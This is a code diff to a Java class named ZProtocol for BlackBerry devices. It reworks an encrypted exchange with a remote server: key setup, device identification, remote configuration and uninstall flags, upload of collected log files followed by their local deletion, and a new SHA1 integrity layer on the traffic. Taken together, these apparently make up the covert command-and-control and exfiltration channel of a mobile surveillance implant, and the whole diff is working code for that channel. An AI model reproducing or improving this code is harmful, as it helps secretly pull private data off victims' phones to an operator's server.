@@ -5,6 +5,7 @@ import java.io.EOFException;
 import java.util.Date;
 import java.util.Vector;
 
+import net.rim.device.api.crypto.Crypto;
 import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.crypto.SHA1Digest;
@@ -33,18 +34,18 @@ import blackberry.utils.WChar;
 
 public class ZProtocol extends Protocol {
 
+    private static final int SHA1LEN = 20;
     //#ifdef DEBUG
     private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
     //#endif
 
-    private final Encryption cryptoK = new EncryptionPKCS5();
-    private final Encryption cryptoConf = new EncryptionPKCS5();
+    private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
+    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5();
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
 
     public boolean perform() {
-
         //#ifdef DBC
         Check.requires(transport != null, "perform: transport = null");
         //#endif
@@ -53,7 +54,7 @@ public class ZProtocol extends Protocol {
         uninstall = false;
 
         // key init
-        cryptoConf.makeKey(Keys.getInstance().getChallengeKey());
+        cryptoConf.makeKey(Encryption.getKeys().getChallengeKey());
         RandomSource.getBytes(Kd);
         RandomSource.getBytes(Nonce);
 
@@ -81,7 +82,7 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.info("***** Identification *****");
             //#endif  
-            response = command(Proto.ID, forgeIdentification(), false);
+            response = command(Proto.ID, forgeIdentification());
             boolean[] capabilities = parseIdentification(response);
 
             if (capabilities[Proto.NEW_CONF]) {
@@ -160,7 +161,7 @@ public class ZProtocol extends Protocol {
 
     ////************************** PROTOCOL *************************************** ////
     protected byte[] forgeAuthentication() {
-        Keys keys = Keys.getInstance();
+        Keys keys = Encryption.getKeys();
 
         byte[] data = new byte[104];
         DataBuffer dataBuffer = new DataBuffer(data, 0, data.length, false);
@@ -237,7 +238,7 @@ public class ZProtocol extends Protocol {
 
             //PBKDF1 (SHA1, c=1, Salt=KS||Kd) 
             final SHA1Digest digest = new SHA1Digest();
-            digest.update(Keys.getInstance().getConfKey());
+            digest.update(Encryption.getKeys().getConfKey());
             digest.update(Ks);
             digest.update(Kd);
 
@@ -597,16 +598,21 @@ public class ZProtocol extends Protocol {
                         + fullLogName);
                 //#endif
 
-                byte[] response = command(Proto.LOG, content, true);
+                byte[] plainOut = new byte[content.length + 4];
+                Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
+                        0, 4);
+                Utils.copy(plainOut, 4, content, 0, content.length);
+
+                byte[] response = command(Proto.LOG, plainOut);
                 boolean ret = parseLog(response);
 
-                if(ret){
-                	logCollector.remove(fullLogName);
-                }else{
-                	//#ifdef DEBUG
+                if (ret) {
+                    logCollector.remove(fullLogName);
+                } else {
+                    //#ifdef DEBUG
                     debug.warn("error sending file, bailing out");
                     //#endif
-                	return;
+                    return;
                 }
             }
             if (!Path.removeDirectory(basePath + dir)) {
@@ -631,22 +637,10 @@ public class ZProtocol extends Protocol {
         //#ifdef DEBUG
         debug.trace("command: " + command);
         //#endif
-        byte[] plainOut = Utils.intToByteArray(command);
-        byte[] cypherOut = cryptoK.encryptData(plainOut);
-        byte[] cypherIn = transport.command(cypherOut);
-        try {
-            byte[] plainIn = cryptoK.decryptData(cypherIn);
-            return plainIn;
-        } catch (CryptoException ex) {
-            //#ifdef DEBUG
-            debug.error("command: " + ex);
-            //#endif
-            throw new ProtocolException(15);
-        }
+        return command(command, new byte[0]);
     }
 
-    private byte[] command(int command, byte[] data, boolean addLen)
-            throws TransportException {
+    private byte[] command(int command, byte[] data) throws TransportException {
         //#ifdef DBC
         Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
         Check.requires(data != null, "cypherCommand: data null");
@@ -657,21 +651,17 @@ public class ZProtocol extends Protocol {
         //#endif
 
         int dataLen = data.length;
-        byte[] plainOut;
-        if (addLen) {
-            plainOut = new byte[dataLen + 8];
-            Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
-            Utils.copy(plainOut, 4, Utils.intToByteArray(data.length), 0, 4);
-            Utils.copy(plainOut, 8, data, 0, data.length);
-
-        } else {
-            plainOut = new byte[dataLen + 4];
-            Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
-            Utils.copy(plainOut, 4, data, 0, data.length);
-        }
+        byte[] plainOut = new byte[dataLen + 4];
+        Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
+        Utils.copy(plainOut, 4, data, 0, data.length);
 
         try {
-            byte[] plainIn = cypheredWriteRead(plainOut);
+            byte[] plainIn;
+            //#ifdef ZNOSHA
+            plainIn = cypheredWriteRead(plainOut);
+            //#else
+            plainIn = cypheredWriteReadSha(plainOut);
+            //#endif
             return plainIn;
         } catch (CryptoException e) {
             //#ifdef DEBUG
@@ -682,28 +672,56 @@ public class ZProtocol extends Protocol {
 
     }
 
+    //#ifdef ZNOSHA
     private byte[] cypheredWriteRead(byte[] plainOut)
             throws TransportException, CryptoException {
-        //#ifdef DEBUG
+
         debug.trace("cypheredWriteRead");
-        //#endif
+
         byte[] cypherOut = cryptoK.encryptData(plainOut);
         byte[] cypherIn = transport.command(cypherOut);
         byte[] plainIn = cryptoK.decryptData(cypherIn);
         return plainIn;
     }
+    //#endif
+
+    private byte[] cypheredWriteReadSha(byte[] plainOut)
+            throws TransportException, CryptoException {
+        //#ifdef DEBUG
+        debug.trace("cypheredWriteReadSha");
+        debug.trace("plainout: "+plainOut.length);
+        //#endif
+
+        byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
+        //#ifdef DEBUG        
+        debug.trace("cypherOut: "+cypherOut.length);
+        //#endif
+        
+        byte[] cypherIn = transport.command(cypherOut);
+
+        if (cypherIn.length < SHA1LEN) {
+            //#ifdef DEBUG
+            debug.error("cypheredWriteReadSha: cypherIn sha len error!");
+            //#endif
+            throw new CryptoException();
+        }
+
+        byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);
+
+       return plainIn;
+
+    }
 
     private boolean checkOk(byte[] result) throws ProtocolException {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
-        	return true;
-        }else if(res == Proto.NO){
-        	//#ifdef DEBUG
+            return true;
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
             debug.error("checkOk: NO");
             //#endif
-        	return false;
-        }
-        else {
+            return false;
+        } else {
             //#ifdef DEBUG
             debug.error("checkOk: " + res);
             //#endif
@@ -711,5 +729,4 @@ public class ZProtocol extends Protocol {
             throw new ProtocolException();
         }
     }
-
 }
